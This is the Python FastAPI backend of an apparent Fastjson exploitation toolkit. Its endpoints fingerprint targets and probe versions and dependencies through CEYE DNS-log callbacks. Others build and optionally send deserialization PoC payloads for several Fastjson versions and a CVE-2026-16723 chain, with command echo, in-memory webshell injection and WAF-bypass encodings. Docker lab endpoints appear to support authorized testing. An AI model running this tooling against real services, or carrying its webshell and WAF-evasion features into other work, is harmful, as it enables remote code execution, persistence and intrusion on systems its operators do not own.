"""FastAPI application."""

from __future__ import annotations

from typing import Any

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from scalar_fastapi import Theme, get_scalar_api_reference

from fastjson_toolkit import __version__
from fastjson_toolkit.api.schemas import (
    DepsRequest,
    DetectRequest,
    ExpectClassRequest,
    HealthResponse,
    LabStartRequest,
    LabStopRequest,
    MemShellGenerateRequest,
    Poc1247Request,
    Poc1268Request,
    Poc1280Request,
    Poc16723Request,
    SettingsResponse,
    SettingsUpdateRequest,
    SettingsUpdateResponse,
    VersionRequest,
)
from fastjson_toolkit.config import (
    load_dotenv,
    mask_secret,
    normalize_ceye_identifier,
    resolve_dotenv_path,
    update_dotenv,
)
from fastjson_toolkit.deps import DepsResult, FastjsonDepsDetector, default_catalog
from fastjson_toolkit.detect import DetectResult, FastjsonDetector
from fastjson_toolkit.detect.probes import all_probes
from fastjson_toolkit.dnslog import CeyeClient, CeyeConfig
from fastjson_toolkit.expect import (
    ExpectClassResult,
    FastjsonExpectClassDetector,
    all_expect_probes,
)
from fastjson_toolkit.poc import (
    Poc1247SendOptions,
    Poc1247SendResult,
    Poc1268SendOptions,
    Poc1268SendResult,
    Poc1280SendOptions,
    Poc1280SendResult,
    Poc16723Options,
    Poc16723Result,
    list_poc_1247_gadgets,
    list_poc_1268_gadgets,
    list_poc_1280_gadgets,
    run_cve_2026_16723,
    run_poc_1247,
    run_poc_1268,
    run_poc_1280,
)
from fastjson_toolkit.poc.v1_2_47 import get_gadget as get_poc_1247_gadget
from fastjson_toolkit.poc.v1_2_68 import get_gadget as get_poc_1268_gadget
from fastjson_toolkit.poc.v1_2_80 import get_gadget as get_poc_1280_gadget
from fastjson_toolkit.version import FastjsonVersionDetector, VersionResult, all_version_probes
from fastjson_toolkit.lab import docker_status, list_lab_status, start_lab, stop_lab
from fastjson_toolkit.waf import (
    WafRequest,
    WafResult,
    WafTechniqueInfo,
    list_techniques,
    run_waf,
)

API_DESCRIPTION = """
FastjsonExpToolkit 后端 API：识别、版本探测、期望类探测、依赖探测、PoC、WAF 绕过、Docker 靶场、设置与探针编排。

## 文档入口

| 路径 | 说明 |
|------|------|
| `/api/docs` | **Scalar**（推荐） |
| `/api/swagger` | Swagger UI |
| `/api/redoc` | ReDoc |
| `/api/openapi.json` | OpenAPI JSON |
"""


def _settings_response() -> SettingsResponse:
    cfg = CeyeConfig.from_env()
    env_path = resolve_dotenv_path()
    if cfg is None:
        return SettingsResponse(
            ceye_token_set=False,
            ceye_token_masked="",
            ceye_identifier="",
            ceye_domain="",
            env_path=str(env_path),
        )
    try:
        identifier, domain = normalize_ceye_identifier(cfg.domain)
    except ValueError:
        identifier, domain = cfg.domain.split(".", 1)[0], cfg.domain
    return SettingsResponse(
        ceye_token_set=True,
        ceye_token_masked=mask_secret(cfg.token),
        ceye_identifier=identifier,
        ceye_domain=domain,
        env_path=str(env_path),
    )


def create_app() -> FastAPI:
    load_dotenv()
    app = FastAPI(
        title="FastjsonExpToolkit API",
        version=__version__,
        description=API_DESCRIPTION,
        docs_url="/api/swagger",
        redoc_url="/api/redoc",
        openapi_url="/api/openapi.json",
        swagger_ui_parameters={"persistAuthorization": True},
    )
    app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )

    @app.get("/api/docs", include_in_schema=False)
    def api_docs():
        """Scalar API Reference（第三方文档 UI）。"""
        return get_scalar_api_reference(
            openapi_url=app.openapi_url,
            title=f"{app.title} · Docs",
            theme=Theme.KEPLER,
            dark_mode=True,
            hide_download_button=False,
            show_sidebar=True,
            default_open_all_tags=True,
        )

    @app.get(
        "/api/health",
        response_model=HealthResponse,
        tags=["system"],
        summary="健康检查",
    )
    def health() -> HealthResponse:
        cfg = CeyeConfig.from_env()
        return HealthResponse(
            status="ok",
            version=__version__,
            ceye_configured=cfg is not None,
            ceye_domain=cfg.domain if cfg else None,
        )

    @app.get(
        "/api/settings",
        response_model=SettingsResponse,
        tags=["settings"],
        summary="读取 CEYE 设置",
    )
    def get_settings() -> SettingsResponse:
        return _settings_response()

    @app.put(
        "/api/settings",
        response_model=SettingsUpdateResponse,
        tags=["settings"],
        summary="保存 CEYE 设置",
    )
    def update_settings(req: SettingsUpdateRequest) -> SettingsUpdateResponse:
        try:
            identifier, domain = normalize_ceye_identifier(req.ceye_identifier)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc

        current = CeyeConfig.from_env()
        token = (req.ceye_token or "").strip()
        if not token:
            token = current.token if current else ""
        if not token:
            raise HTTPException(status_code=400, detail="请填写 CEYE Token")

        env_path = update_dotenv(
            {
                "CEYE_TOKEN": token,
                "CEYE_DOMAIN": domain,
            }
        )
        return SettingsUpdateResponse(
            ok=True,
            message=f"已写入 {env_path}",
            settings=SettingsResponse(
                ceye_token_set=True,
                ceye_token_masked=mask_secret(token),
                ceye_identifier=identifier,
                ceye_domain=domain,
                env_path=str(env_path),
            ),
        )

    @app.post(
        "/api/settings/ceye-test",
        tags=["settings"],
        summary="测试 CEYE API",
    )
    def test_ceye() -> dict[str, Any]:
        cfg = CeyeConfig.from_env()
        if cfg is None:
            raise HTTPException(status_code=400, detail="未配置 CEYE Token")
        try:
            with CeyeClient(cfg) as client:
                records = client.query("dns", filter_text="")
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"CEYE 连接失败: {exc}") from exc
        return {
            "ok": True,
            "domain": cfg.domain,
            "record_count": len(records),
            "message": "CEYE API 可用",
        }

    @app.get(
        "/api/probes",
        tags=["detect"],
        summary="列出识别探针",
    )
    def list_probes(dnslog: str | None = None) -> list[dict[str, Any]]:
        return [
            {
                "id": p.id,
                "category": p.category,
                "description": p.description,
                "prefer_typed": p.prefer_typed,
                "dns_related": p.dns_related,
                "payload": p.payload,
                "weight": p.weight,
                "non_exclusive": p.non_exclusive,
            }
            for p in all_probes(dnslog)
        ]

    @app.post(
        "/api/detect",
        response_model=DetectResult,
        tags=["detect"],
        summary="Fastjson 识别",
    )
    def detect(req: DetectRequest) -> DetectResult:
        target = req.target.strip()
        if not target:
            raise HTTPException(status_code=400, detail="target 不能为空")

        ceye_cfg = None
        if req.include_dns and req.use_ceye:
            env_cfg = CeyeConfig.from_env()
            token = req.ceye_token or (env_cfg.token if env_cfg else None)
            domain = req.ceye_domain or (env_cfg.domain if env_cfg else "hpdth2.ceye.io")
            if token:
                ceye_cfg = CeyeConfig(token=token, domain=domain)

        detector = FastjsonDetector(
            timeout=req.timeout,
            headers=req.headers or None,
            proxy=req.proxy,
            verify_tls=not req.insecure,
            dnslog_host=req.dnslog,
            ceye=ceye_cfg,
            ceye_wait=req.ceye_wait,
            timing_threshold_ms=req.timing_threshold_ms,
            content_type=req.content_type,
        )
        try:
            return detector.detect(target, include_dns=req.include_dns)
        except Exception as exc:  # noqa: BLE001 — surface to client
            raise HTTPException(status_code=502, detail=f"探测失败: {exc}") from exc
        finally:
            detector.close()

    @app.get(
        "/api/version/probes",
        tags=["version"],
        summary="列出版本探针",
    )
    def list_version_probes(dnslog: str | None = None) -> list[dict[str, Any]]:
        hosts = None
        if dnslog:
            from fastjson_toolkit.version.probes import validate_dns_host

            try:
                base = validate_dns_host(dnslog)
            except ValueError as exc:
                raise HTTPException(status_code=400, detail=str(exc)) from exc
            hosts = {
                "le47": f"le47.{base}",
                "le68": f"le68.{base}",
                "d80a": f"d80a.{base}",
                "d80b": f"d80b.{base}",
            }
        return [
            {
                "id": p.id,
                "category": p.category,
                "description": p.description,
                "dns_related": p.dns_related,
                "dns_tags": list(p.dns_tags),
                "payload": p.payload,
            }
            for p in all_version_probes(hosts)
        ]

    @app.post(
        "/api/version",
        response_model=VersionResult,
        tags=["version"],
        summary="Fastjson 版本探测",
    )
    def version_detect(req: VersionRequest) -> VersionResult:
        target = req.target.strip()
        if not target:
            raise HTTPException(status_code=400, detail="target 不能为空")

        ceye_cfg = None
        if req.include_dns and req.use_ceye:
            env_cfg = CeyeConfig.from_env()
            token = req.ceye_token or (env_cfg.token if env_cfg else None)
            domain = req.ceye_domain or (env_cfg.domain if env_cfg else "hpdth2.ceye.io")
            if token:
                ceye_cfg = CeyeConfig(token=token, domain=domain)

        detector = FastjsonVersionDetector(
            timeout=req.timeout,
            headers=req.headers or None,
            proxy=req.proxy,
            verify_tls=not req.insecure,
            dnslog_host=req.dnslog,
            ceye=ceye_cfg,
            ceye_wait=req.ceye_wait,
            content_type=req.content_type,
        )
        try:
            return detector.detect(target, include_dns=req.include_dns)
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"版本探测失败: {exc}") from exc
        finally:
            detector.close()

    @app.get(
        "/api/deps/catalog",
        tags=["deps"],
        summary="列出内置依赖探测类目录",
    )
    def list_deps_catalog() -> list[dict[str, Any]]:
        return [
            {
                "class": e.clazz,
                "description": e.description,
                "category": e.category,
            }
            for e in default_catalog()
        ]

    @app.post(
        "/api/deps",
        response_model=DepsResult,
        tags=["deps"],
        summary="Fastjson 依赖探测",
    )
    def deps_detect(req: DepsRequest) -> DepsResult:
        target = req.target.strip()
        if not target:
            raise HTTPException(status_code=400, detail="target 不能为空")

        method = (req.method or "character").strip().lower()
        if method not in ("character", "dns"):
            raise HTTPException(
                status_code=400, detail="method 仅支持 character 或 dns"
            )

        ceye_cfg = None
        if method == "dns" and req.use_ceye:
            env_cfg = CeyeConfig.from_env()
            token = req.ceye_token or (env_cfg.token if env_cfg else None)
            domain = req.ceye_domain or (env_cfg.domain if env_cfg else "hpdth2.ceye.io")
            if token:
                ceye_cfg = CeyeConfig(token=token, domain=domain)

        detector = FastjsonDepsDetector(
            timeout=req.timeout,
            headers=req.headers or None,
            proxy=req.proxy,
            verify_tls=not req.insecure,
            dnslog_host=req.dnslog,
            ceye=ceye_cfg,
            ceye_wait=req.ceye_wait,
            content_type=req.content_type,
            concurrency=req.concurrency,
        )
        try:
            return detector.scan(
                target,
                method=method,
                classes=req.classes or None,
                categories=req.categories or None,
            )
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"依赖探测失败: {exc}") from exc
        finally:
            detector.close()

    @app.get(
        "/api/expect/probes",
        tags=["expect"],
        summary="列出期望类探针",
    )
    def list_expect_probes(base_body: str | None = None) -> list[dict[str, Any]]:
        try:
            probes = all_expect_probes(base_body)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        return [
            {
                "id": p.id,
                "category": p.category,
                "description": p.description,
                "payload": p.payload,
            }
            for p in probes
        ]

    @app.post(
        "/api/expect",
        response_model=ExpectClassResult,
        tags=["expect"],
        summary="期望类（expectClass）探测",
    )
    def expect_detect(req: ExpectClassRequest) -> ExpectClassResult:
        target = req.target.strip()
        if not target:
            raise HTTPException(status_code=400, detail="target 不能为空")

        detector = FastjsonExpectClassDetector(
            timeout=req.timeout,
            headers=req.headers or None,
            proxy=req.proxy,
            verify_tls=not req.insecure,
            content_type=req.content_type,
        )
        try:
            return detector.detect(target, base_body=req.base_body)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"期望类探测失败: {exc}") from exc
        finally:
            detector.close()

    @app.get(
        "/api/poc/1.2.47/gadgets",
        tags=["poc"],
        summary="Fastjson ≤1.2.47 gadget 目录",
    )
    def poc_1247_gadgets() -> list[dict[str, Any]]:
        return list_poc_1247_gadgets()

    @app.get(
        "/api/poc/echo/engines",
        tags=["poc"],
        summary="命令回显引擎目录（多中间件 / JDK12+）",
    )
    def poc_echo_engines() -> list[dict[str, str]]:
        from fastjson_toolkit.poc.echo import list_engines

        return list_engines()

    @app.post(
        "/api/poc/1.2.47",
        response_model=Poc1247SendResult,
        tags=["poc"],
        summary="Fastjson ≤1.2.47 缓存绕过证明 PoC",
        description=(
            "生成 Class 缓存绕过 payload（JdbcRowSet / BCEL+dbcp / C3P0 / MyBatis / H2）。"
            "echo=true 时为 BCEL/H2/MyBatis 自动生成回显类；"
            "memshell=true 时注入内存马（与 echo 互斥）。"
            "默认只生成；send=true 时 POST 到 target（授权测试）。"
        ),
    )
    def poc_1247(req: Poc1247Request) -> Poc1247SendResult:
        try:
            get_poc_1247_gadget(req.gadget)
        except KeyError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc

        opts = Poc1247SendOptions(
            gadget=req.gadget,
            jndi_url=req.jndi_url,
            bcel_code=req.bcel_code,
            class_b64=req.class_b64,
            user_overrides=req.user_overrides,
            serialized_b64=req.serialized_b64,
            h2_url=req.h2_url,
            getter_trigger=req.getter_trigger,
            currency_field=req.currency_field,
            json_key_with_type=req.json_key_with_type,
            json_key_as_array=req.json_key_as_array,
            echo=req.echo,
            engine=req.engine,  # type: ignore[arg-type]
            cmd=req.cmd,
            cmd_header=req.cmd_header,
            memshell=req.memshell,
            ms_api=req.ms_api,
            ms_server=req.ms_server,
            ms_tool=req.ms_tool,
            ms_type=req.ms_type,
            ms_path=req.ms_path,
            ms_jdk=req.ms_jdk,
            waf_techniques=list(req.waf_techniques or []),
            waf_options=req.waf_options,
            target=req.target,
            send=req.send,
            timeout=req.timeout,
            headers=req.headers or {},
            proxy=req.proxy,
            insecure=req.insecure,
            content_type=req.content_type,
        )
        try:
            return run_poc_1247(opts)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"PoC 失败: {exc}") from exc

    @app.get(
        "/api/poc/1.2.68/gadgets",
        tags=["poc"],
        summary="Fastjson ≤1.2.68 gadget 目录",
    )
    def poc_1268_gadgets(
        include_hidden: bool = False,
    ) -> list[dict[str, Any]]:
        return list_poc_1268_gadgets(include_hidden=include_hidden)

    @app.post(
        "/api/poc/1.2.68",
        response_model=Poc1268SendResult,
        tags=["poc"],
        summary="Fastjson ≤1.2.68 AutoCloseable 证明 PoC",
        description=(
            "生成 expectClass(AutoCloseable) 绕过 payload（JDK 写/截断、commons-io、"
            "MySQL/PG 等）。默认只生成；send=true 时 POST 到 target（授权测试）。"
            "依赖靶场：lab/fastjson-1268-lab :18268。"
        ),
    )
    def poc_1268(req: Poc1268Request) -> Poc1268SendResult:
        try:
            get_poc_1268_gadget(req.gadget)
        except KeyError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc

        opts = Poc1268SendOptions(
            gadget=req.gadget,
            file=req.file,
            content=req.content,
            source=req.source,
            url=req.url,
            guess_byte=req.guess_byte,
            bom_bytes=req.bom_bytes,
            host=req.host,
            port=req.port,
            user=req.user,
            jdbc_url=req.jdbc_url,
            socket_factory_arg=req.socket_factory_arg,
            wrap_currency=req.wrap_currency,
            currency_field=req.currency_field,
            echo=req.echo,
            engine=req.engine,  # type: ignore[arg-type]
            cmd=req.cmd,
            cmd_header=req.cmd_header,
            attack_base=req.attack_base,
            memshell=req.memshell,
            ms_api=req.ms_api,
            ms_server=req.ms_server,
            ms_tool=req.ms_tool,
            ms_type=req.ms_type,
            ms_path=req.ms_path,
            ms_jdk=req.ms_jdk,
            waf_techniques=list(req.waf_techniques or []),
            waf_options=req.waf_options,
            target=req.target,
            send=req.send,
            timeout=req.timeout,
            headers=req.headers or {},
            proxy=req.proxy,
            insecure=req.insecure,
            content_type=req.content_type,
        )
        try:
            return run_poc_1268(opts)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"PoC 失败: {exc}") from exc

    @app.get(
        "/api/poc/1.2.80/gadgets",
        tags=["poc"],
        summary="Fastjson ≤1.2.80 gadget 目录",
    )
    def poc_1280_gadgets() -> list[dict[str, Any]]:
        return list_poc_1280_gadgets()

    @app.post(
        "/api/poc/1.2.80",
        response_model=Poc1280SendResult,
        tags=["poc"],
        summary="Fastjson ≤1.2.80 Exception 缓存证明 PoC",
        description=(
            "生成 Exception expectClass + 反序列化器缓存绕过 payload（jackson→InputStream、"
            "commons-io、PG/MySQL、groovy、aspectj、jython）。多步链按 steps 顺序发送。"
            "依赖靶场：lab/fastjson-1280-lab :18280。"
        ),
    )
    def poc_1280(req: Poc1280Request) -> Poc1280SendResult:
        try:
            get_poc_1280_gadget(req.gadget)
        except KeyError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc

        opts = Poc1280SendOptions(
            gadget=req.gadget,
            file=req.file,
            content=req.content,
            url=req.url,
            guess_byte=req.guess_byte,
            host=req.host,
            port=req.port,
            user=req.user,
            socket_factory_arg=req.socket_factory_arg,
            classpath=req.classpath,
            wrap_currency=req.wrap_currency,
            currency_field=req.currency_field,
            echo=req.echo,
            engine=req.engine,  # type: ignore[arg-type]
            cmd=req.cmd,
            cmd_header=req.cmd_header,
            attack_base=req.attack_base,
            memshell=req.memshell,
            ms_api=req.ms_api,
            ms_server=req.ms_server,
            ms_tool=req.ms_tool,
            ms_type=req.ms_type,
            ms_path=req.ms_path,
            ms_jdk=req.ms_jdk,
            waf_techniques=list(req.waf_techniques or []),
            waf_options=req.waf_options,
            target=req.target,
            send=req.send,
            reset_cache=req.reset_cache,
            timeout=req.timeout,
            headers=req.headers or {},
            proxy=req.proxy,
            insecure=req.insecure,
            content_type=req.content_type,
        )
        try:
            return run_poc_1280(opts)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"PoC 失败: {exc}") from exc

    @app.get(
        "/api/waf/techniques",
        response_model=list[WafTechniqueInfo],
        tags=["waf"],
        summary="列出 WAF 绕过变换",
    )
    def waf_techniques() -> list[WafTechniqueInfo]:
        return list_techniques()

    @app.post(
        "/api/waf",
        response_model=WafResult,
        tags=["waf"],
        summary="对 payload 应用 WAF 绕过变换",
        description=(
            "支持 unicode/hex/\\u+、多逗号、key 插入 _/-、字符填充、value URL 编码等。"
            "mode=stack 按 techniques 顺序叠加；mode=variants（或 techniques 为空）生成各单项变体。"
        ),
    )
    def waf_transform(req: WafRequest) -> WafResult:
        try:
            return run_waf(req)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"WAF 变换失败: {exc}") from exc

    @app.get(
        "/api/lab/docker",
        tags=["lab"],
        summary="Docker 环境识别",
        description="检测 docker / daemon / compose 是否可用。",
    )
    def lab_docker() -> dict[str, Any]:
        env = docker_status()
        return {
            "ready": env.ready,
            "docker_installed": env.docker_installed,
            "docker_running": env.docker_running,
            "compose_available": env.compose_available,
            "compose_backend": env.compose_backend,
            "docker_version": env.docker_version,
            "compose_version": env.compose_version,
            "engine_info": env.engine_info,
            "errors": env.errors,
        }

    @app.get(
        "/api/lab",
        tags=["lab"],
        summary="列出靶场状态",
        description="含端口占用检测与容器运行状态，便于按需启动。",
    )
    def lab_list() -> dict[str, Any]:
        env = docker_status()
        labs = [s.to_dict() for s in list_lab_status(env=env)]
        return {
            "docker": {
                "ready": env.ready,
                "docker_installed": env.docker_installed,
                "docker_running": env.docker_running,
                "compose_available": env.compose_available,
                "compose_backend": env.compose_backend,
                "docker_version": env.docker_version,
                "compose_version": env.compose_version,
                "engine_info": env.engine_info,
                "errors": env.errors,
            },
            "labs": labs,
        }

    @app.post(
        "/api/lab/{lab_id}/start",
        tags=["lab"],
        summary="启动靶场",
        description="启动前校验 Docker 环境与端口占用；冲突则拒绝启动。",
    )
    def lab_start(
        lab_id: str,
        req: LabStartRequest = LabStartRequest(),
    ) -> dict[str, Any]:
        result = start_lab(
            lab_id,
            build=req.build,
            timeout=req.timeout,
            ports=req.ports,
        )
        if not result.ok and result.message.startswith("未知靶场"):
            raise HTTPException(status_code=404, detail=result.message)
        if not result.ok:
            detail = result.message
            if result.logs:
                detail = detail + " | " + " | ".join(result.logs[-8:])
            raise HTTPException(status_code=409, detail=detail)
        return result.to_dict()

    @app.post(
        "/api/lab/{lab_id}/stop",
        tags=["lab"],
        summary="停止靶场",
    )
    def lab_stop(
        lab_id: str,
        req: LabStopRequest = LabStopRequest(),
    ) -> dict[str, Any]:
        result = stop_lab(lab_id, remove=req.remove, timeout=req.timeout)
        if not result.ok and result.message.startswith("未知靶场"):
            raise HTTPException(status_code=404, detail=result.message)
        if not result.ok:
            detail = result.message
            if result.logs:
                detail = detail + " | " + " | ".join(result.logs[-8:])
            raise HTTPException(status_code=409, detail=detail)
        return result.to_dict()

    @app.post(
        "/api/poc/cve-2026-16723",
        response_model=Poc16723Result,
        tags=["poc"],
        summary="CVE-2026-16723（Fastjson 1.2.83）证明 PoC",
        description=(
            "jar:http 出网 / fd-cache 不出网证明。需本机 javac、fastjson-1.2.83.jar，"
            "以及可出网的攻击者 HTTP 端口。Docker 靶场：lab/cve-2026-16723。"
        ),
    )
    def poc_cve_2026_16723(req: Poc16723Request) -> Poc16723Result:
        mode = (req.mode or "http").strip().lower()
        if mode not in ("http", "fd"):
            raise HTTPException(status_code=400, detail="mode 仅支持 http 或 fd")
        engine = (req.engine or "auto").strip().lower()
        from fastjson_toolkit.poc.echo import ECHO_ENGINES

        if engine not in ECHO_ENGINES:
            raise HTTPException(
                status_code=400,
                detail=f"engine 仅支持 {', '.join(ECHO_ENGINES)}",
            )
        target = req.target.strip()
        if not target:
            raise HTTPException(status_code=400, detail="target 不能为空")

        opts = Poc16723Options(
            target=target,
            mode=mode,  # type: ignore[arg-type]
            host=req.host,
            port=req.port,
            cmd=req.cmd,
            echo=req.echo,
            engine=engine,  # type: ignore[arg-type]
            json_path=req.json_path,
            docker_container=req.docker_container,
            reuse_type=req.reuse_type,
            memshell=req.memshell,
            ms_api=req.ms_api,
            ms_server=req.ms_server,
            ms_tool=req.ms_tool,
            ms_type=req.ms_type,
            ms_path=req.ms_path,
            ms_jdk=req.ms_jdk,
        )
        try:
            return run_cve_2026_16723(opts)
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(status_code=502, detail=f"PoC 执行失败: {exc}") from exc

    @app.get(
        "/api/memshell/config",
        tags=["poc"],
        summary="内存马 server/tool/type 配置矩阵",
        description="默认走内置 memshell-gen.jar；backend 可传 http(s)://... 回退 boot。",
    )
    def memshell_config(backend: str = "jar") -> dict[str, Any]:
        from fastjson_toolkit.poc.memshell import fetch_config

        try:
            return fetch_config(backend)
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(
                status_code=502, detail=f"读取 memshell config 失败: {exc}"
            ) from exc

    @app.post(
        "/api/memshell/generate",
        tags=["poc"],
        summary="独立生成内存马 injector",
        description="返回 injector Base64 与连接信息；不经 Fastjson 投递链。",
    )
    def memshell_generate_api(req: MemShellGenerateRequest) -> dict[str, Any]:
        from fastjson_toolkit.poc.memshell import generate_memshell

        try:
            ms = generate_memshell(
                backend=req.backend,
                server=req.server,
                tool=req.tool,
                shell_type=req.shell_type,
                url_pattern=req.path,
                jdk=req.jdk,
                static_initialize=req.static_initialize,
            )
        except Exception as exc:  # noqa: BLE001
            raise HTTPException(
                status_code=502, detail=f"生成内存马失败: {exc}"
            ) from exc
        return {
            "ok": True,
            "memshell_info": ms.as_info_dict(),
            "memshell_connect": ms.connect_info,
            "injector_b64": ms.injector_b64,
            "injector_class": ms.injector_class,
            "shell_class": ms.shell_class,
        }

    return app


app = create_app()
